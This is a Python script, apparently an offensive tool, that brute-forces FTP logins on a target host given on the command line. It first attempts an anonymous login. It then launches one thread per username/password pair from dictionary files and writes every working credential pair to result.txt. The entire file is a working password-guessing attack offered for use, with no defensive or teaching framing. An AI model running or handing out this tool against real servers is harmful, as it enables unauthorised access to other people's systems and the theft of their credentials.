import optparse
import ftplib
import threading
import socket
import time
#screen_lock = threading.Semaphore(value=1)


def anonyLogin(host):
    """
    匿名随机登录一下
    """
    try:
        ftp = ftplib.FTP(host)
        ftp.connect(host, 21, timeout = 10)
        ftp.login('anonymous', 'test@qq.com')
        ftp.retrlines('LIST')
        ftp.quit()
        print('\n[*]' + str(host) + ' FTP Anonymous Logon Succeeded.')
    except Exception as e:
        print('\n[-] ' + str(host) + ' FTP Anonymous Logon Failed.')
        
def ftpLogin(host, userName, password):
    try:
        #screen_lock.acquire()
        print('[-] Trying: ' + userName + '/' + password)
        #screen_lock.release()
        ftp = ftplib.FTP(host)
        ftp.connect(host, 21, timeout = 10)
        ftp.login(userName, password)
        ftp.retrlines('LIST')
        ftp.quit()
        print('Succeeded')
        
        f = open('result.txt', 'a')
        f.write('host: {}\t user: {}\t passwd: {}\n'.format(host, userName, password))
        f.close()
        
    except ftplib.all_errors:
        pass
        
def bruteForce(host, usersFile, pwdFile):
    userfn = open(usersFile, 'r')
    pwdfn = open(pwdFile, 'r')
    for user in userfn.readlines():
        # Reset the pwdfn filepointer(0)
        pwdfn.seek(0)
        for passwd in pwdfn.readlines():
            userName = user.strip('\n')
            passWord = passwd.strip('\n')
            t = threading.Thread(target=ftpLogin, args=(host, userName, passWord))
            child = t.start()

def main():
    parser = optparse.OptionParser('usage%prog -H <target host> -u <users dictionary> -p <password dictionary>')
    parser.add_option('-H', dest='tgtHost', type='string', help='specify the host')
    parser.add_option('-u', dest='userDic', type='string', help='specify the dictionary for user')
    parser.add_option('-p', dest='pwdDic', type='string', help='specify the dictionary for password')
    (options, args) = parser.parse_args()
    host = options.tgtHost
    userDic = options.userDic
    pwdDic = options.pwdDic
    try:
        tgthost = socket.gethostbyname(host)
    except:
        print("[-] Cannot Resolve '%s': Unknown host" %host)
        exit(0)
    anonyLogin(tgthost)
    bruteForce(tgthost, userDic, pwdDic)
    
if __name__ == '__main__':
    start = time.time()
    print(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()))

    main()

    end = time.time()
    print(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()))
    spend_time   = end - start
    spend_hour   = spend_time // 3600
    spend_minute = (spend_time - spend_hour * 3600) // 60
    spend_second = spend_time - spend_hour * 3600 - spend_minute * 60
    print('程序耗时: %d小时%d分%d秒.' % (spend_hour, spend_minute, spend_second))
